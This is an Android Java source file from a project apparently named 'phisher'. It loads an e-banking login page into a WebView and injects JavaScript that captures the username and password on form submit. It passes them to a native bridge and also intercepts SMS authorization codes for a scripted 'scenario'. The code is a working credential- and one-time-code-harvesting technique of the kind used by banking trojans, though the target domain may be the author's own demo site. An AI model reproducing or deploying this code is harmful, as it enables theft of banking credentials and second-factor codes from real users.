package pl.jasiun.phisher;

import pl.jasiun.phisher.scenario.Scenario;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.Toast;

@SuppressLint("SetJavaScriptEnabled")
public class WebViewActivity extends Activity implements AndroidController {
	
	private WebView webView;
	
	private Scenario scenario;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web_view);
        
        scenario = new Scenario(this);
        
        webView = (WebView)findViewById(R.id.webView);
        getWebView().getSettings().setJavaScriptEnabled(true);
        
        getWebView().setWebViewClient(new WebViewClient()
        {
        	    public boolean shouldOverrideUrlLoading(WebView webView, String url){
        	    	webView.loadUrl(url);
        	        return false;
        	   }
        	    
        	    public void onPageFinished (WebView webView, String url) {
        	    	webView.loadUrl("javascript:$('form').submit(function(){" +
							"Android.save('username',$('#username').val());" +
							"Android.save('password',$('#password').val());" +
						"});");
        	    	
        	    	scenario.pageLoaded();
        	    }
        });
        
        getWebView().addJavascriptInterface(new JavaScriptInterface(this), "Android");
        
        getWebView().loadUrl("http://seabank.jasiun.pl/ebanking/login/");
        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				scenario.play();	
			}
		});
    }
    
    protected void onNewIntent (Intent intent) {
    	scenario.smsReceived(intent.getExtras().getString("CODE"));
    }

	public WebView getWebView() {
		return webView;
	}

	@Override
	public void sendIntent(Intent intent) {
		sendBroadcast(intent);
	}

	@Override
	public void loadUrl(String url) {
		webView.loadUrl(url);
	}
}